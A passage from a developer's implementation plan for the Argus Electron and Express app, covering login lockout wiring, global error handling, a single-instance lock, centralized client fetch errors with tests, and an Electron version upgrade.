  Call `loginLimiter.recordFailure(ip)` in the wrong-password branch before the 401; `loginLimiter.recordSuccess(ip)` after `generateToken`.
- [ ] **Step 8: Wire ngrok (`ngrok.ts`).** Add `loginLimiter` param. Replace lines 26-30 with the required-password check + `validatePasswordStrength` (400 on `!ok`); add a lockout gate (429 if locked) at the top of `/start`.
- [ ] **Step 9: Thread in `index.ts`.** After `authService` (~119): `const loginLimiter = new LoginRateLimiter();`. Update mounts: `createNgrokRoutes(ngrokService, authService, loginLimiter)`, `createAuthRoutes(authService, loginLimiter)`.
- [ ] **Step 10: Suite + build + commit.** `cd server && npm test && npm run build`. `git commit -m "feat(server): add per-IP login lockout and password strength check"`

---

# STABILITY CLUSTER (server + electron)

### Task 6: Global error handling — [HIGH]

**Why:** No Express 4-arg error middleware, no `unhandledRejection`/`uncaughtException` handlers. Express 4 does **not** forward async-handler rejections → they become unhandled rejections (process-crash vector on Node ≥15).

**Design decisions:**
- Add an **`asyncHandler()` wrapper** (funnel async throws into the error middleware → clean 500, socket stays up) **plus** process handlers as the backstop. Relying on process handlers alone would either crash on one bad request or hang the request forever.
- **Policy:** `unhandledRejection` → log + continue (long-lived daemon; tmux-backed sessions must not die over one stray rejection — see memory `argus-tmux-session-survival`). `uncaughtException` → log + exit(1) (undefined V8 state; host restarts, sessions survive via tmux).
- **Envelope:** `{ error: string }`, matching existing routes.
- **Fire-and-forget fix:** the bare `this.persistSessions()` in `markSessionDone` (`SessionManager.ts:421`) — grep for every bare site first, then `void this.persistSessions().catch(err => console.error('persistSessions failed:', err))` each.

> Tests in `node:test` form (transcribed; `mock` from `node:test` replaces `vi`).

**Files:**
- Create: `server/src/middleware/errorHandler.ts`, `server/src/process/globalHandlers.ts`
- Modify: `server/src/index.ts` (mount `errorHandler` last; call `registerProcessHandlers()`), `server/src/services/SessionManager.ts:421` (+ siblings)
- Test: `server/src/middleware/errorHandler.test.ts`, `server/src/process/globalHandlers.test.ts`

- [ ] **Step 1: Enumerate bare persist calls.** `grep -n 'this.persistSessions()' server/src/services/SessionManager.ts` — record every line (task names 421; confirm the full set). Also confirm `persistSessions()` returns a Promise (if sync, drop the `.catch`).
- [ ] **Step 2: Failing test — errorHandler + asyncHandler.** New `server/src/middleware/errorHandler.test.ts`:
  ```ts
  import { test } from 'node:test';
  import assert from 'node:assert/strict';
  import { errorHandler, asyncHandler } from './errorHandler.js';

  test('errorHandler returns a 500 {error} envelope', () => {
    let statusCode = 200; let body: unknown;
    const res: any = { headersSent: false, status(c: number) { statusCode = c; return this; }, json(b: unknown) { body = b; return this; } };
    errorHandler(new Error('boom'), {} as any, res, () => {});
    assert.equal(statusCode, 500);
    assert.deepEqual(body, { error: 'Internal server error' });
  });
  test('asyncHandler forwards a rejected promise to next', async () => {
    let passed: unknown;
    const wrapped = asyncHandler(async () => { throw new Error('async boom'); });
    await wrapped({} as any, {} as any, (e?: unknown) => { passed = e; });
    await new Promise((r) => setImmediate(r));
    assert.ok(passed instanceof Error);
    assert.equal((passed as Error).message, 'async boom');
  });
  ```
- [ ] **Step 3: Run — expect fail**, then implement `server/src/middleware/errorHandler.ts`:
  ```ts
  import type { Request, Response, NextFunction, RequestHandler } from 'express';
  export function errorHandler(err: unknown, _req: Request, res: Response, _next: NextFunction): void {
    console.error('Unhandled route error:', err);
    if (res.headersSent) return;
    res.status(500).json({ error: 'Internal server error' });
  }
  export function asyncHandler(fn: (req: Request, res: Response, next: NextFunction) => Promise<unknown>): RequestHandler {
    return (req, res, next) => { Promise.resolve(fn(req, res, next)).catch(next); };
  }
  ```
- [ ] **Step 4: Run — expect pass.**
- [ ] **Step 5: Failing test — process handlers.** New `server/src/process/globalHandlers.test.ts` (uses `node:test` `mock`):
  ```ts
  import { test, mock } from 'node:test';
  import assert from 'node:assert/strict';
  import { registerProcessHandlers } from './globalHandlers.js';

  test('unhandledRejection logs and does not exit', () => {
    const err = mock.method(console, 'error', () => {});
    const exit = mock.method(process, 'exit', () => undefined as never);
    registerProcessHandlers();
    process.emit('unhandledRejection', new Error('stray'), Promise.resolve());
    assert.ok(err.mock.calls.length > 0);
    assert.equal(exit.mock.calls.length, 0);
    process.removeAllListeners('unhandledRejection');
    process.removeAllListeners('uncaughtException');
  });
  ```
- [ ] **Step 6: Run — expect fail**, then implement `server/src/process/globalHandlers.ts`:
  ```ts
  let registered = false;
  export function registerProcessHandlers(): void {
    if (registered) return; // idempotent — safe under Electron + test re-entry
    registered = true;
    process.on('unhandledRejection', (reason) => { console.error('Unhandled promise rejection:', reason); });
    process.on('uncaughtException', (err) => { console.error('Uncaught exception, exiting:', err); process.exit(1); });
  }
  ```
  (The module-level `registered` guard means the test must run before any prior registration in-process; keep it the single case in this file.)
- [ ] **Step 7: Run — expect pass.**
- [ ] **Step 8: Mount + register in `index.ts`.** Import both. Add `app.use(errorHandler);` as the **last** `app.use` — after the production static `app.get('*', …)` block (~181). Call `registerProcessHandlers()` at the top of `startServer()` (so Electron-embedded gets it) and once in the `if (!process.versions.electron)` block (~226); the guard makes the duplicate harmless.
- [ ] **Step 9: Fix fire-and-forget.** At `SessionManager.ts:421` and every sibling from Step 1:
  ```ts
  void this.persistSessions().catch((err) => console.error('persistSessions failed:', err));
  ```
- [ ] **Step 10: Suite + build + commit.** `cd server && npm test && npm run build`. `git commit -m "feat(server): add global error middleware, process handlers, and await persist failures"`

---

### Task 7: Single-instance lock + graceful port-conflict — [HIGH]

**Why:** No `app.requestSingleInstanceLock()`; a second launch spawns a second in-process server, loses the :5757 race, and after 5 EADDRINUSE retries `index.ts:185` calls `process.exit(1)` — hard-kills the whole app silently.

**Lifecycle facts:** server is imported in-process (`main.ts:243`), driven via `server.startServer()` (`main.ts:425`) which has a `.catch` at `main.ts:439-442`. The `httpServer.on('error')` handler (`index.ts:186-195`) is registered at module-eval and is **not** wired to the `startServer()` promise (which only resolves, on `listen`, at 203-206). Quit/tray: `window-all-closed` is a no-op (tray keeps alive); window `close` hides-to-tray unless `appIsQuitting`; `before-quit` races `doShutdown()` against a 10s timeout.

**Files:**
- Modify: `electron/src/main.ts` (lock before `whenReady`; guard `main()`; dialog on EADDRINUSE)
- Modify: `server/src/index.ts:185-208` (reject `startServer()` on conflict under Electron instead of exit)

- [ ] **Step 1: Acquire lock at module top (after `app.disableHardwareAcceleration()`, line 18).**
  ```ts
  const gotLock = app.requestSingleInstanceLock();
  if (!gotLock) {
    app.quit();
  } else {
    app.on('second-instance', () => { showWindow(); });
  }
  ```
  (`showWindow` already imported at `main.ts:7`; `app.quit()` is safe pre-window/pre-server.)
- [ ] **Step 2: Guard `whenReady` so the loser never runs `main()`.** Wrap the existing `app.whenReady().then(...)` (438-443):
  ```ts
  if (gotLock) {
    app.whenReady().then(() => {
      main().catch((err) => {
        console.error('[electron] startup error:', err);
        if (err && (err as NodeJS.ErrnoException).code === 'EADDRINUSE') {
          dialog.showMessageBoxSync({
            type: 'error',
            title: 'Argus is already running',
            message: 'Argus could not start its local server.',
            detail: `Port ${process.env.ARGUS_PORT ?? '5757'} is already in use. Quit the other instance and try again.`,
            buttons: ['Quit'],
          });
        }
        app.quit();
      });
    });
  }
  ```
  (`dialog` imported at `main.ts:1`; `showMessageBoxSync` needs no parent window.)
- [ ] **Step 3: Make the server reject (not exit) under Electron.** In `index.ts`, replace the `httpServer.on('error', …)` block (185-195):
  ```ts
  let listenRetries = 0;
  let onListenError: ((err: NodeJS.ErrnoException) => void) | null = null;
  httpServer.on('error', (err: NodeJS.ErrnoException) => {
    if (err.code === 'EADDRINUSE' && listenRetries < 5) {
      listenRetries++;
      console.log(`Port ${PORT} in use, retrying in 500ms… (${listenRetries}/5)`);
      setTimeout(() => httpServer.listen(PORT, HOST), 500);
      return;
    }
    console.error('Server error:', err);
    if (process.versions.electron && onListenError) { onListenError(err); onListenError = null; return; }
    process.exit(1);
  });
  ```
- [ ] **Step 4: Wire `startServer()` to the rejector** (replace its `return new Promise(...)` body, 202-207):
  ```ts
  return new Promise((resolve, reject) => {
    onListenError = (err) => reject(err);
    httpServer.listen(PORT, HOST, () => {
      onListenError = null;
      console.log(`Server running on ${HOST}:${PORT}`);
      resolve();
    });
  });
  ```
- [ ] **Step 5: Build + smoke-test.** `npm run build:all`. (a) Start one instance, launch a second with the same `ARGUS_PORT` → second exits immediately, first window foregrounds. (b) Hold the port with `node -e "require('http').createServer().listen(5403,'127.0.0.1',()=>setTimeout(()=>{},1e9))"`, launch Argus once → after ~2.5s the "Argus is already running" dialog appears and the app quits cleanly (no silent exit).
- [ ] **Step 6: Commit.** `git checkout -b fix/single-instance-port-conflict && git add electron/src/main.ts server/src/index.ts && git commit -m "fix(electron): single-instance lock + graceful port-conflict dialog"`

---

# CLIENT CLUSTER (vitest)

### Task 9: Centralize client fetch error handling (fix optimistic-delete) — [HIGH]

**Why:** ~50 endpoints in `api.ts` call `res.json()` without checking `res.ok`. `deleteSession` (L52) resolves on a 5xx, so `useSessions.deleteSession` (L84-87) removes the row locally even when the server delete failed; non-JSON error bodies surface as opaque `SyntaxError`. Token logic is also duplicated across `authFetch` and three inline endpoints (`getNgrokStatus` L330, `getAuthStatus` L383, `login` L390).

**Design decision:** one `request(path, init)` helper: attaches the bearer token (dedupe `authFetch`), throws `ApiError(status, server.error)` on `!res.ok`, tolerates empty/non-JSON via `text()`-then-try-`JSON.parse`. Preserves the existing 401 → clear-token + `auth:unauthorized` dispatch. `listBranchesForRepo` keeps its fallback by catching `ApiError` locally. `useSessions.deleteSession` no longer mutates on throw; toasts danger and rethrows (server's `session:deleted` event remains the real removal path).

**Files:**
- Create: `client/vitest.config.ts`, `client/src/test/setup.ts`
- Modify: `client/package.json` (scripts + devDeps), `client/tsconfig.app.json` (add `vitest/globals` to `types`), `client/src/services/api.ts`, `client/src/hooks/useSessions.ts`
- Test: `client/src/services/api.test.ts`, `client/src/hooks/useSessions.test.tsx`

- [ ] **Step 1: Add deps + scripts.** In `client/package.json` devDeps: `vitest ^3.2.0`, `jsdom ^26.0.0`, `@testing-library/react ^16.3.0`, `@testing-library/jest-dom ^6.6.0`, `@testing-library/dom ^10.4.0`. Scripts: `"test": "vitest run"`, `"test:watch": "vitest"`. Run `npm install -w client`. (Pin to the latest stable at execution time.)
- [ ] **Step 2: Config + setup.** Create `client/vitest.config.ts`:
  ```ts
  /// <reference types="vitest/config" />
  import { defineConfig } from 'vitest/config';
  import react from '@vitejs/plugin-react';
  export default defineConfig({
    plugins: [react()],
    define: { __ARGUS_VERSION__: JSON.stringify('test') },
    test: { globals: true, environment: 'jsdom', setupFiles: ['./src/test/setup.ts'], include: ['src/**/*.{test,spec}.{ts,tsx}'] },
  });
  ```
  Create `client/src/test/setup.ts`:
  ```ts
  import '@testing-library/jest-dom/vitest';
  if (typeof globalThis.localStorage === 'undefined') {
    const store = new Map<string, string>();
    globalThis.localStorage = {
      getItem: (k: string) => store.get(k) ?? null,
      setItem: (k: string, v: string) => void store.set(k, String(v)),
      removeItem: (k: string) => void store.delete(k),
      clear: () => store.clear(),
      key: (i: number) => [...store.keys()][i] ?? null,
      get length() { return store.size; },
    } as Storage;
  }
  ```
  Add `"vitest/globals"` to `compilerOptions.types` in `client/tsconfig.app.json`. Run `npm test -w client` → "No test files found" (infra boots).
- [ ] **Step 3: Failing test — api.test.ts.**
  ```ts
  import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
  import { api, ApiError, setToken } from './api.js';
  describe('api request() error handling', () => {
    beforeEach(() => { setToken('tok-123'); vi.restoreAllMocks(); });
    afterEach(() => { setToken(null); });
    it('throws ApiError carrying status + server {error} on 500', async () => {
      vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ error: 'session is busy' }), { status: 500, headers: { 'Content-Type': 'application/json' } })));
      await expect(api.deleteSession('s1')).rejects.toMatchObject({ name: 'ApiError', status: 500, message: 'session is busy' });
    });
    it('non-JSON 500 body yields ApiError, not SyntaxError', async () => {
      vi.stubGlobal('fetch', vi.fn(async () => new Response('<html>502</html>', { status: 502 })));
      const err = await api.deleteSession('s1').catch((e) => e);
      expect(err).toBeInstanceOf(ApiError);
      expect(err.status).toBe(502);
    });
    it('attaches the bearer token', async () => {
      const fetchMock = vi.fn(async () => new Response('[]', { status: 200, headers: { 'Content-Type': 'application/json' } }));
      vi.stubGlobal('fetch', fetchMock);
      await api.getSessions();
      expect(new Headers((fetchMock.mock.calls[0][1] as RequestInit).headers).get('Authorization')).toBe('Bearer tok-123');
    });
    it('resolves undefined for a 204 (delete success)', async () => {
      vi.stubGlobal('fetch', vi.fn(async () => new Response(null, { status: 204 })));
      await expect(api.deleteSession('s1')).resolves.toBeUndefined();
    });
  });
  ```
  Run → FAIL (`ApiError`/`request` absent; `deleteSession` resolves on 500).
- [ ] **Step 4: Failing test — useSessions.test.tsx.**
  ```tsx
  import { describe, it, expect, vi, beforeEach } from 'vitest';
  import { renderHook, act, waitFor } from '@testing-library/react';
  import { useSessions } from './useSessions.js';
  import { api, ApiError } from '../services/api.js';
  import { pushToast } from '../components/primitives/index.js';
  vi.mock('../services/api.js', async (orig) => {
    const mod = await orig<typeof import('../services/api.js')>();
    return { ...mod, api: { ...mod.api, getSessions: vi.fn(), deleteSession: vi.fn() } };
  });
  vi.mock('../components/primitives/index.js', () => ({ pushToast: vi.fn() }));
  const fakeSocket = { on: vi.fn(), off: vi.fn() } as any;
  describe('useSessions.deleteSession', () => {
    beforeEach(() => vi.clearAllMocks());
    it('keeps the session and toasts danger when delete fails', async () => {
      (api.getSessions as any).mockResolvedValue([{ id: 's1', status: 'idle' }]);
      (api.deleteSession as any).mockRejectedValue(new ApiError(500, 'boom'));
      const { result } = renderHook(() => useSessions(fakeSocket));
      await waitFor(() => expect(result.current.sessions).toHaveLength(1));
      await act(async () => { await expect(result.current.deleteSession('s1')).rejects.toBeInstanceOf(ApiError); });
      expect(result.current.sessions.map((s) => s.id)).toContain('s1');
      expect(pushToast).toHaveBeenCalledWith(expect.stringContaining('Failed'), 'danger');
    });
    it('removes the session on success', async () => {
      (api.getSessions as any).mockResolvedValue([{ id: 's1', status: 'idle' }]);
      (api.deleteSession as any).mockResolvedValue(undefined);
      const { result } = renderHook(() => useSessions(fakeSocket));
      await waitFor(() => expect(result.current.sessions).toHaveLength(1));
      await act(async () => { await result.current.deleteSession('s1'); });
      expect(result.current.sessions).toHaveLength(0);
    });
  });
  ```
  (Verify `useSessions`' real signature — it may take the socket differently; adapt `renderHook`.)
- [ ] **Step 5: Implement `ApiError` + `request()` in `api.ts`** (replace the `authFetch` block, L18-31):
  ```ts
  export class ApiError extends Error {
    constructor(public readonly status: number, message: string, public readonly body?: unknown) {
      super(message); this.name = 'ApiError';
    }
  }
  function withAuth(init?: RequestInit): RequestInit {
    const token = getToken();
    const headers = new Headers(init?.headers);
    if (token) headers.set('Authorization', `Bearer ${token}`);
    return { ...init, headers };
  }
  async function parseBody(res: Response): Promise<unknown> {
    const text = await res.text();
    if (!text) return undefined;
    try { return JSON.parse(text); } catch { return text; }
  }
  async function request<T = unknown>(path: string, init?: RequestInit): Promise<T> {
    const res = await fetch(path, withAuth(init));
    if (res.status === 401) {
      setToken(null);
      window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      throw new ApiError(401, 'Authentication required');
    }
    const body = await parseBody(res);
    if (!res.ok) {
      const message = (body && typeof body === 'object' && 'error' in body && typeof (body as { error: unknown }).error === 'string')
        ? (body as { error: string }).error : `Request failed (${res.status})`;
      throw new ApiError(res.status, message, body);
    }
    return body as T;
  }
  ```
- [ ] **Step 6: Migrate all endpoints to `request()`.** Unwrap wrapper shapes consistently — e.g. `getSessions: () => request<SessionInfo[]>(\`${API_BASE}/sessions\`)`; `deleteSession: async (id) => { await request<void>(\`${API_BASE}/sessions/${id}\`, { method: 'DELETE' }); }`; `getSessionOrder: async () => (await request<{ order: string[] }>(...)).order`; `getPathCompletions → .completions`; `pickFolder → .path`; `getGroups → .groups`. Route the three inline-token endpoints through `request` too. `startNgrok`/`login` keep their post-success `setToken` + event dispatch. `listBranchesForRepo` wraps in `try/catch (e) { if (e instanceof ApiError) return { branches: [], currentBranch: '' }; throw e; }`. Delete `authFetch` once `grep authFetch` → 0. **Grep each migrated symbol's callers** to confirm the unwrapped shape matches (the silent-break risk).
- [ ] **Step 7: Run api.test.ts — expect pass.** `npm test -w client`.
- [ ] **Step 8: Fix `useSessions.deleteSession`** (L84-87). Import `{ api, ApiError }` and `{ pushToast }`:
  ```ts
  const deleteSession = useCallback(async (id: string) => {
    try {
      await api.deleteSession(id);
    } catch (err) {
      const msg = err instanceof ApiError ? err.message : 'Failed to close session';
      pushToast(`Failed to close session: ${msg}`, 'danger');
      throw err;
    }
    setSessions((prev) => prev.filter((s) => s.id !== id));
  }, []);
  ```
- [ ] **Step 9: Run useSessions.test.tsx — expect pass.**
- [ ] **Step 10: Verify + commit.** `npm test -w client && npm run build -w client && npm run lint -w client`. `git checkout -b fix/client-fetch-errors && git commit -m "feat(client): centralize fetch error handling, fix optimistic-delete-on-failure"`

---

# UPGRADE CLUSTER (verification-heavy)

### Task 8: Upgrade Electron off EOL v33 — [HIGH]

**Why:** `package.json:38` pins `electron ^33.0.0` (33.4.11) — past EOL by mid-2026, shipping an unpatched Chromium/Node.

This task is bump → build → manual smoke checklist, each step with a concrete pass criterion. No unit tests.

- [ ] **Step 1: Pick the target major (re-verify at execution).** As of mid-2026 the supported window is the latest three majors (≈40/41/42, 42 latest stable). **Target 42** unless `npm view electron version` + https://endoflife.date/electron show a newer stable; never target an EOL row. Pass: chosen major is in a non-EOL row.
- [ ] **Step 2: Bump.** `package.json:38` `^33.0.0` → `^42.0.0`; `npm install`. Pass: `npm ls electron` shows one resolved version, no peer conflicts.
- [ ] **Step 3: Rebuild native deps.** `npx electron-builder install-app-deps` (rebuild node-pty for the new ABI). Pass: exits 0; `node_modules/node-pty/build/Release/pty.node` mtime updated; `scripts/postinstall.js` re-chmod runs clean.
- [ ] **Step 4: build:all.** `npm run build:all`. Pass: exits 0, no new TS errors. Watch Electron-typing drift in `main.ts`/`window.ts`/`tray.ts`/`preload.ts` (`Notification`, `nativeImage`, `dialog.showMessageBox`, `webUtils.getPathForFile`).
- [ ] **Step 5: package:mac (ad-hoc path, `CSC_LINK` unset).** `npm run package:mac`. Pass: arm64 + x64 `.dmg` produced; `afterPack.cjs` runs the ad-hoc re-sign + terminal-notifier stash/restore; final `codesign --verify --deep --strict` passes.
- [ ] **Step 6: package:mac (Developer-ID path, if secrets available).** With `CSC_LINK`/`CSC_KEY_PASSWORD` (+ notarize creds). Pass: `afterPack.cjs` early-returns, hardened-runtime sign + notarize complete, `spctl -a -vvv Argus.app` → accepted/Notarized. Else mark N/A.
- [ ] **Step 7: terminal-notifier integrity.** `codesign --verify --deep --strict <app>` and `codesign -dvv .../Resources/terminal-notifier/terminal-notifier.app`. Pass: nested bundle shows its **original committed** signature (afterPack stash survived).
- [ ] **Step 8: Cold-GPU DOM-renderer.** Evict shader cache (reboot or `sudo killall -9 com.apple.WebKit.GPU; sudo purge`), launch packaged app, open a session. Pass: box-drawing glyphs + icon render correctly on first paint, no garbling (confirms `disableHardwareAcceleration()` still works on new Chromium). Highest-risk regression.
- [ ] **Step 9: Tray + notifications + survival.** Tray click → window shows; drive a session to `waiting` → notification delivered + dock badge; "Quit & Stop All" stops sessions; "Quit (Keep Sessions)" + relaunch → sessions survive via tmux. Also re-verify Task 7 (lock, hide-to-tray, before-quit race) on the new Electron.
- [ ] **Step 10: Cadence config.** Create `.github/renovate.json`:
  ```json
  {
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": ["config:recommended"],
    "packageRules": [{ "matchPackageNames": ["electron"], "groupName": "electron", "schedule": ["before 6am on monday"] }]
  }
  ```
  (Or `.github/dependabot.yml` weekly npm if the repo uses Dependabot.) Pass: `npx --yes renovate-config-validator .github/renovate.json` exits 0.
- [ ] **Step 11: Commit.** `git checkout -b chore/upgrade-electron-42 && git add package.json package-lock.json .github/renovate.json && git commit -m "chore(electron): upgrade off EOL v33 to v42"`

---

## Self-review

- **Coverage:** all 9 tracked tasks (#1–#9) are present, each mapped to its finding. Doc-drift / dead-code / perf findings from the audit are intentionally **out of scope** for this plan (separate cleanup PR).
- **Test-runner consistency:** server = `node:test` (Tasks 1–6); client = vitest (Task 9). The vitest snippets in the original Task 4–6 drafts are reconciled to `node:test` here.
- **Symbol consistency:** `enforced`/`setExposed` (Task 1), `isRegistered` (Task 2), `resolveRelativeWithinBase` (Task 3), `validatePasswordStrength`/`LoginRateLimiter` (Task 4), `isDebugScrollEnabled`/`writeScrollTrace` (Task 5), `errorHandler`/`asyncHandler`/`registerProcessHandlers` (Task 6), `onListenError`/`startServer` (Task 7), `ApiError`/`request` (Task 9) — used consistently across their tasks.
- **Known verification gaps flagged inline:** exact builtin agent ids (Task 2), `ConfigStore.load` shape (Task 2), `createGitRoutes` arity + router-stack internals (Task 3), `persistSessions` return type + full bare-call set (Task 6), `useSessions` signature (Task 9), endpoint unwrap shapes (Task 9). Implementer confirms each at execution time.
